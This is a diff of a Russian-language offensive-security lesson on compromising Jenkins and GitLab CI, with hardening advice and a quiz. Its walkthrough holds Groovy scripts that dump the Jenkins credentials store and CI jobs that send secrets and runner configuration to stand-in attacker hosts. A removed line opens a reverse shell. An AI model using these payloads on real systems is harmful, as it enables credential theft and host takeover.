@@ -14,262 +14,238 @@ useful_for:
 estimated_minutes: 55
 summary: "Как атаковать Jenkins и GitLab CI: script console, Groovy RCE, credentials store, GitLab runners и pipeline injection. Пути к облачным кредам и хосту."
 ---
+## Задача
 
-Jenkins и GitLab CI — два самых распространённых self-hosted CI/CD. Оба имеют доступ к продакшену и облачным кредам, оба исторически полны RCE. Урок — практический: от обнаружения до извлечения кредов и захвата раннера.
+GitHub Actions мы разобрали. Но в корпоративных сетях до сих пор живут **self-hosted CI-серверы**: Jenkins и GitLab. Они ближе к «обычному хосту»: у них есть веб-интерфейс, плагины и хранилище кредов. Задача — показать, как доступ к такому серверу превращается в выполнение кода и кражу облачных секретов. Разберём на Jenkins.
 
-## Jenkins: карта поверхности
+## Данные: что открыто у Jenkins
 
-Типовые эндпоинты и уязвимости:
+Находим Jenkins на `https://ci.acme.io`. Первым делом смотрим, что доступно без аутентификации:
 
-| Точка | Риск |
-|-------|------|
-| `/script` (Script Console) | Groovy RCE |
-| `/manage` | Управление плагинами/креденшелами |
-| `/computer/(node)/script` | RCE на агенте |
-| `/jnlpJars/` | Загрузка JNLP-агентов |
-| `/cli` (remoting) | CLI RCE при слабой аутентификации |
-| CVE-2024-23897 | Чтение файлов через CLI (args4j) |
-
-```bash
-# Обнаружение
-nmap -Pn -p 8080,50000 --open <CIDR>
-curl -s http://<host>:8080/login | grep -i jenkins
-curl -s http://<host>:8080/api/json | jq '.jobs[].name'
+```
+$ curl -s https://ci.acme.io/api/json | jq '.jobs[].name'
+"deploy-prod"
+"build-api"
+"release-worker"
+$ curl -s -o /dev/null -w "%{http_code}\n" https://ci.acme.io/script
+200
 ```
 
-## Groovy RCE через Script Console
+Две вещи: список job'ов отдаётся анонимно (`/api/json`), и — главное — страница `/script` отвечает `200`. Это **Script Console** Jenkins, и она не защищена.
 
-Если `/script` доступен (или есть админ-доступ), выполняем Groovy:
+## Пробуем в лоб: что вообще даёт Jenkins
+
+Jenkins запускает сборки на агентах, а креды (пароли, ключи, токены, облачные креды) хранятся в его **credentials store** и подставляются в джобы. Значит, если мы исполняем код **внутри** Jenkins (в Groovy-консоли или в пайплайне), мы получаем доступ ко всем кредам, к которым у сервера есть права.
+
+Проверим версию — вдруг есть известная дыра:
+
+```
+$ curl -s https://ci.acme.io/login | grep -o 'Jenkins [0-9.]*'
+Jenkins 2.414.1
+```
+
+Но нам даже не нужна CVE: консоль открыта.
+
+## Приём: Groovy RCE через Script Console
+
+Script Console принимает **Groovy** — язык, работающий на JVM, где живёт Jenkins. Из него доступен весь Java API сервера, включая хранилище кредов. Вытаскиваем все логины/пароли:
 
 ```groovy
-// Выполнение команды
-def proc = "id".execute()
-println(proc.text)
-
-// Чтение credentials store
-import com.cloudbees.plugins.credentials.*
-import com.cloudbees.plugins.credentials.common.*
-def creds = CredentialsProvider.lookupCredentials(
-  StandardUsernamePasswordCredentials.class,
+def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
+  com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class,
   Jenkins.instance, null, null)
-creds.each { c -> println("${c.id}:${c.username}:${c.password}") }
-
-// Secret text / строки
-def texts = CredentialsProvider.lookupCredentials(
-  org.jenkinsci.plugins.plaincredentials.StringCredentials.class,
-  Jenkins.instance, null, null)
-texts.each { t -> println("${t.id}:${t.secret}") }
+creds.each { c -> println(c.id + ":" + c.username + ":" + c.password) }
 ```
 
-Список задач и их параметров:
+Отправляем через API:
 
-```bash
-curl -s http://<host>:8080/api/json?tree=jobs[name,url]
-curl -s http://<host>:8080/job/<job>/config.xml
+```
+$ curl -s --data-urlencode 'script=println("id=" + System.getProperty("user.name"))' https://ci.acme.io/scriptText
+id=jenkins
 ```
 
-## Jenkins: от анонимного доступа к RCE
+Так же одной строкой Groovy можно выполнить системную команду — это полноценный RCE на хосте Jenkins:
 
-Частые конфигурации:
-- **Anonymous read** — доступ к `/api/json`, конфигам, иногда к `/script`.
-- **Agent → master** — агент может подключиться к master и выполнить Groovy на нём.
-- **Устаревшие плагины** — RCE-цепочки (Script Security bypass).
-
-```bash
-# Проверить анонимный доступ к script console
-curl -s -o /dev/null -w '%{http_code}' http://<host>:8080/script
-# Список плагинов и версий (для CVE)
-curl -s http://<host>:8080/pluginManager/api/json?depth=1 | jq -r '.plugins[] | .shortName + ":" + .version'
+```groovy
+println "curl -s https://attacker.example/?x=$(id)".execute().text
 ```
 
-## GitLab CI: runners и pipeline injection
+## Полный прогон: от /script до облачных кредов
 
-GitLab-специфика:
+1. **Разведка.** `/api/json` → список job'ов; `/script` → 200 (не защищено).
+2. **Читаем креды.** Groovy-скриптом обходим credentials store.
+3. **Ищем облачные креды.** Среди найденных — `AWS_ACCESS_KEY_ID`/`SECRET`, `AZURE_*`, `GCP_*`.
+4. **Проверяем.** Уходим с хоста с добытым ключом:
 
-- **Runner** — исполнитель job'ов; часто self-hosted, с доступом к сети и секретам.
-- **CI/CD Variables** — секреты проекта/группы.
-- **`CI_JOB_TOKEN`** — токен job'а, доступ к API и другим проектам.
-
-```bash
-# Логи job'а (могут светить секреты)
-glab ci list -R group/project
-glab ci trace <job-id>
-
-# Переменные проекта
-glab variable list -R group/project
+```
+$ AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... aws sts get-caller-identity
+{ "Arn": "arn:aws:iam::123456789012:user/jenkins-deploy" }
 ```
 
-Pipeline injection: если атакующий может править `.gitlab-ci.yml` в MR и job запускается с protected variables, он исполняет код с секретами.
+5. **RCE на хосте.** Если нужно — `execute()` запускает команды от пользователя `jenkins`.
+
+Важно: Jenkins часто запускается в контейнере с **примонтированным `docker.sock`**, чтобы собирать образы. Тогда из RCE легко выйти на хост (см. `cloud-docker-socket`).
+
+## GitLab CI: похожая история
+
+GitLab не имеет «script console», но даёт не меньше:
+
+- **CI/CD Variables** проекта. Переменная, помеченная *protected*, доступна только на защищённых ветках — но пуш в `main` (или запуск job'а на нужной ветке) снимает ограничение.
+- **`.gitlab-ci.yml`** контролирует, что запускается. Если у нас есть право на MR, можно подсунуть job, читающий переменные:
 
 ```yaml
-# Вредоносный job
-evil:
+steal:
   script:
-    - env | base64 | curl -s --data-binary @- https://attacker/
+    - env | grep -i -E 'AWS|TOKEN|SECRET' | curl -s -d @- https://attacker.example/x
 ```
 
-## Разобранный пример: Jenkins → облачные креды
+- **`CI_JOB_TOKEN`** — токен job'а; им можно ходить в API GitLab и, при слабых настройках, в другие проекты.
+- **Runners.** Shared-runner разделён между проектами; specific-runner — полноценный хост. Если раннер **privileged** и монтирует `docker.sock`, из job'а можно захватить хост.
 
-**Дано:** Jenkins с анонимным read и устаревшим плагином, дающим Groovy.
+Проверить раннеры и переменные (с доступом к API):
 
-1. Читаем список job'ов и их конфиги:
-
-```bash
-curl -s http://<host>:8080/api/json?tree=jobs[name,url]
-curl -s http://<host>:8080/job/deploy/config.xml | grep -iE 'aws|secret|token'
+```
+$ curl -s --header "PRIVATE-TOKEN: $GL_TOKEN" https://gitlab.acme.io/api/v4/projects/1/variables | jq '.[].key'
+"AWS_ACCESS_KEY_ID"
+"DEPLOY_TOKEN"
 ```
 
-2. Выполняем Groovy через `/script` (или через RCE-плагин), читаем credentials store (команды выше).
-3. Находим AWS-ключи, проверяем `aws sts get-caller-identity`.
-4. Дальше — по дереву (см. `cloud-privesc-iam`).
+## Плагины, агенты и что ещё цеплять
 
-## От CI-раннера к хосту
+Jenkins почти всегда увешан плагинами, и каждый — потенциальная дыра. Быстрая разведка:
 
-Self-hosted runner — это полноценный хост с доступом к сети. Захватив job, вы можете:
+- **`/manage` и `/configure`** — открыты ли настройки анонимно.
+- **Агенты** (`/computer/`) — подключённые ноды; на них можно запускать job'ы.
+- **`/whoAmI/api/json`** — что нам разрешено как анонимному пользователю.
+- **`/pluginManager/api/json`** — список плагинов и версий (ищем известные CVE).
 
-```bash
-# Разведка окружения раннера
-id; hostname; ip a; env | grep -iE 'aws|token|secret'
-# Доступ к docker (часто смонтирован docker.sock)
-ls -la /var/run/docker.sock
-# Доступ к kubeconfig
-find / -name "*.kubeconfig" -o -name "config" -path "*kube*" 2>/dev/null
+```
+$ curl -s https://ci.acme.io/pluginManager/api/json | jq -r '.plugins[].shortName' | head
+credentials
+git
+pipeline
+matrix-auth
 ```
 
-## Частые ошибки
+Если в списке нет `matrix-auth` — разграничение прав, скорее всего, не настроено, и анонимный доступ к `/script` закономерен. Наоборот, наличие `matrix-auth` ещё не значит, что он настроен правильно: часто роль `anonymous` имеет `Overall/Read`, а иногда и больше.
 
-- **Игнорировать `/script`.** Даже при «анонимном read» он иногда открыт.
-- **Забывать про агентов.** RCE на агенте может дать доступ к master.
-- **Смотреть только секреты.** В конфигах job'ов бывают и креды, и пути к внутренним сервисам.
-- **Путать `CI_JOB_TOKEN` и personal token.** У них разные права.
-- **Не проверять плагины.** Устаревший плагин — частый RCE.
-- **Не смотреть раннер как на хост.** Там docker.sock, kubeconfig, SSH-ключи.
+## Защита и что ломает атаку
 
-## Что дальше / решение
+- **Закрыть Script Console** (Matrix Authorization, `Overall/Administer` только админам).
+- **Не хранить облачные креды как статические** — использовать OIDC (см. `cloud-oidc-federation`).
+- **Protected + masked переменные** в GitLab и запрет на незащищённые ветки.
+- **Не монтировать `docker.sock`** в раннеры; использовать rootless-сборку.
+- **Изоляция раннеров** — эфемерные агенты на каждый job.
 
-- Есть `/script` или RCE → читайте credentials store.
-- Есть анонимный read → читайте конфиги job'ов и плагины.
-- Есть GitLab → смотрите переменные и раннеры.
-- Смежные уроки: `cloud-cicd-secrets`, `cloud-cicd-github-actions`, `cloud-supply-chain`.
+## Если не сработало
 
-## Script Console и Groovy payloads
+- **Script Console закрыта** — смотрите другие плагины с RCE, агентов, `/computer/(built-in)/log`.
+- **Креды в Vault/KMS** — статического ключа нет.
+- **Protected-ветки без права пуша** — переменные недоступны.
+- **Эфемерные раннеры** — следов и файлов на диске почти нет.
 
-Jenkins Script Console (`/script`) выполняет Groovy от имени сервера:
+## Мини-сценарий: /script за несколько шагов
+
+1. **Проверка.** `curl -s -o /dev/null -w '%{http_code}' https://ci.acme.io/script` → `200`. Консоль не защищена.
+2. **Разведка job'ов.** `curl -s https://ci.acme.io/api/json | jq '.jobs[].name'` → `deploy-prod`, `build-api`.
+3. **Чтение кредов.** Groovy-скриптом обходим credentials store:
 
 ```groovy
-def p = "id".execute(); p.waitFor(); println p.text
-// чтение креденшелов
-def creds = Jenkins.instance.credentialsStore.getCredentials(...)
-// реверс-шелл
-["bash","-c","bash -i >& /dev/tcp/ATTACKER/4444 0>&1"].execute()
+def c = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
+  com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class,
+  Jenkins.instance, null, null)
+c.each { println(it.id + ":" + it.username + ":" + it.password) }
 ```
 
-Проверка доступа: `curl -s http://TARGET:8080/script` — если 200 и нет аутентификации, это RCE.
+4. **Добыча.** Среди кредов — `AWS_ACCESS_KEY_ID`/`SECRET` от `jenkins-deploy`.
+5. **Проверка.** `aws sts get-caller-identity` с этими кредами → роль деплоя.
+6. **RCE на хосте.** `println "id".execute().text` исполняет команды от пользователя `jenkins`; если смонтирован `docker.sock` — выход на хост.
 
-## GitLab CI: runners и injection
+Открытая `/script` — это сразу и креды, и выполнение кода.
 
-- **Runner token** утекает в `.gitlab-ci.yml` или через `env`.
-- **Pipeline injection**: изменение `.gitlab-ci.yml` в MR → выполнение на раннере.
-- **Protected variables** не защищают от кода в том же репозитории.
-- **Shared runners** могут иметь доступ к секретам проекта.
+## Что мы теперь знаем
 
-```yaml
-stages: [test]
-test:
-  script: [ "curl -d @/etc/gitlab-runner/config.toml http://attacker/" ]
-```
+1. Jenkins Script Console = Groovy RCE и доступ к credentials store.
+2. GitLab CI Variables и `CI_JOB_TOKEN` — источники секретов.
+3. Раннеры часто дают выход на хост (особенно с `docker.sock`).
+4. Статические облачные креды в CI — прямой путь в облако.
+5. Защита — закрытая консоль, OIDC, protected-переменные, изоляция.
 
-## От CI-раннера к хосту и облаку
+## На что смотреть дальше
 
-Раннер часто имеет Docker-сокет (для сборки образов) → побег на хост. Плюс переменные с облачными креды (OIDC или static) → доступ в аккаунт. Проверяйте `/var/run/docker.sock`, `env`, `~/.aws/credentials`, `~/.config/gcloud`.
+- `/script` и `/scriptText` на Jenkins (200 или редирект на логин).
+- `/api/json`, `/computer/`, открытые job'ы.
+- GitLab: CI/CD Variables, protected-флаги, раннеры.
+- Монтируется ли `docker.sock` в раннеры/агенты.
+- Есть ли статические облачные креды в credentials store.
 
-## Практическое задание
+## Быстрая проверка
 
-Поднимите Jenkins в Docker, включите анонимный доступ к `/script`, выполните `println "id".execute().text`. Затем добавьте credential (AWS-ключ) и извлеките его через Groovy. Оцените, как из этого получить облачный доступ. Для защиты — отключите анонимный `/script`, ограничьте права.
-
-## Сравнение Jenkins и GitLab CI
-
-| Аспект | Jenkins | GitLab CI |
-|--------|---------|-----------|
-| RCE-точка | Script Console (Groovy) | `.gitlab-ci.yml` на раннере |
-| Анонимный доступ | часто к `/script` | редко |
-| Секреты | credentials store | CI/CD variables |
-| Побег на хост | плагины, агенты, docker.sock | docker.sock в раннере |
-| Персистентность | job/cron, плагин | scheduled pipeline |
-
-## Защита
-
-- Jenkins: аутентификация, отключение `/script`, sandbox Groovy, обновление плагинов, изоляция агентов.
-- GitLab: protected branches, защищённые переменные, отдельные runners для доверенных проектов, запрет MR-пайплайнов с секретами.
-- Общее: не давать раннерам docker.sock и облачные креды без нужды; использовать OIDC вместо static-ключей.
-
-## Практическое задание 2
-
-В GitLab-проекте создайте переменную с «секретом», затем в MR измените `.gitlab-ci.yml`, чтобы она выводилась (`echo $SECRET`). Убедитесь, что пайплайн MR её не показывает, если включены protected variables, и показывает, если нет. Это демонстрирует, как конфигурация CI определяет утечку секретов.
-
-## Плагины как поверхность атаки
-
-Jenkins-плагины имеют доступ к серверу и часто уязвимы (deserialization, SSRF, RCE). Проверьте версии и известные CVE плагинов: `/pluginManager/api/json?tree=plugins[shortName,version]`. Устаревший плагин с публичным эксплойтом — прямой путь к RCE даже без Script Console. Обновляйте плагины и удаляйте неиспользуемые.
-
-## Быстрая проверка Jenkins
+Три запроса без аутентификации многое расскажут о Jenkins:
 
 ```bash
-curl -s http://TARGET:8080/api/json?tree=jobs[name]
-curl -s http://TARGET:8080/script
-curl -s http://TARGET:8080/pluginManager/api/json?tree=plugins[shortName,version]
+curl -s -o /dev/null -w '%{http_code}\n' https://ci.acme.io/script   # 200 = RCE-консоль открыта
+curl -s https://ci.acme.io/api/json | jq '.jobs[].name'              # список job'ов
+curl -s https://ci.acme.io/pluginManager/api/json | jq '.plugins[].shortName'
 ```
 
-Открытый `/script` = RCE. Доступ к API без auth раскрывает джобы и креды. Устаревшие плагины — дополнительный вектор. Начинайте с этих трёх запросов.
+`200` на `/script` — считай, что Jenkins уже скомпрометирован.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Какой эндпоинт Jenkins даёт Groovy RCE?"
+- question: "Что даёт Jenkins Script Console?"
   options:
-    - "/script (Script Console)"
-    - "/login"
-    - "/favicon.ico"
-    - "/robots.txt"
+    - "Выполнение Groovy-кода с доступом к API Jenkins и кредам"
+    - "Только чтение логов"
+    - "Смену темы интерфейса"
+    - "Перезапуск агента"
   answer: 0
-  explanation: "Script Console выполняет произвольный Groovy."
-- question: "Где Jenkins хранит креды для job'ов?"
+  explanation: "Groovy на JVM Jenkins = RCE и доступ к credentials store."
+- question: "Где Jenkins хранит пароли и токены?"
   options:
-    - "В credentials store (доступен через Groovy/плагины)"
-    - "В README"
-    - "В git-логе"
-    - "В /etc/hosts"
+    - "В credentials store"
+    - "В .gitlab-ci.yml"
+    - "В S3"
+    - "В DNS"
   answer: 0
-  explanation: "CredentialsProvider отдаёт секреты через API/Groovy."
-- question: "Что такое GitLab runner?"
+  explanation: "Креды лежат в credentials store и подставляются в job'ы."
+- question: "Что такое protected-переменная в GitLab CI?"
   options:
-    - "Исполнитель job'ов, часто self-hosted с доступом к сети и секретам"
-    - "Тип merge request"
-    - "Формат .gitlab-ci.yml"
-    - "Плагин Jenkins"
+    - "Переменная, доступная только на защищённых ветках/тегах"
+    - "Зашифрованная переменная"
+    - "Переменная только для админов"
+    - "Переменная раннера"
   answer: 0
-  explanation: "Раннер исполняет пайплайн и имеет доступ к окружению."
-- question: "Почему self-hosted раннер опасен при компрометации?"
+  explanation: "protected ограничивает переменную защищёнными ref."
+- question: "Почему docker.sock в раннере опасен?"
   options:
-    - "Это полноценный хост с docker.sock, kubeconfig и SSH-ключами"
-    - "Он всегда изолирован"
-    - "У него нет сети"
-    - "Он не хранит секреты"
+    - "Через него из job'а можно захватить хост"
+    - "Он замедляет сборку"
+    - "Он шифрует слои"
+    - "Он удаляет образы"
   answer: 0
-  explanation: "Раннер — доверенный узел внутри периметра."
-- question: "Какой класс уязвимостей часто даёт RCE в Jenkins?"
+  explanation: "Доступ к docker.sock = контроль над хостом."
+- question: "Как снизить риск от CI-сервера с облачными правами?"
   options:
-    - "Устаревшие плагины и Script Security bypass"
-    - "Неверный часовой пояс"
-    - "Медленный диск"
-    - "Старый браузер"
+    - "Использовать OIDC вместо статических кредов и изолировать раннеры"
+    - "Дать всем админку"
+    - "Отключить логи"
+    - "Хранить ключи в job-скрипте"
   answer: 0
-  explanation: "Плагины — основной источник RCE-цепочек."
+  explanation: "OIDC + эфемерные изолированные раннеры снижают импакт."
 ```
+
+## Куда дальше
+
+В следующем уроке (`cloud-oidc-federation`) мы разберём OIDC глубже: какие условия trust-политик критичны и как звёздочка в них открывает роль кому угодно. А пока главное: CI-сервер — это хост с кредами, и RCE на нём почти всегда равен облачному доступу.
 
 ## Где пригодится
 
-- **Пентест:** эксплуатация Jenkins/GitLab в корпоративной сети.
-- **Red team:** от CI к облачным кредам и хосту.
-- **CTF:** задачи с CI/CD.
-- **Работа/DevSecOps:** обновление плагинов, изоляция раннеров, protected variables.
-- **Дальше по дереву:** `cloud-cicd-secrets`, `cloud-privesc-iam`.
+- **Bug bounty:** открытые Jenkins и GitLab.
+- **Red team:** от CI-сервера к облачным кредам.
+- **Пентест:** аудит CI/CD-инфраструктуры.
+- **Работа/DevSecOps:** закрытая консоль, OIDC, изоляция раннеров.
+- **Дальше по дереву:** `cloud-oidc-federation`, `cloud-gitlab-ci`.
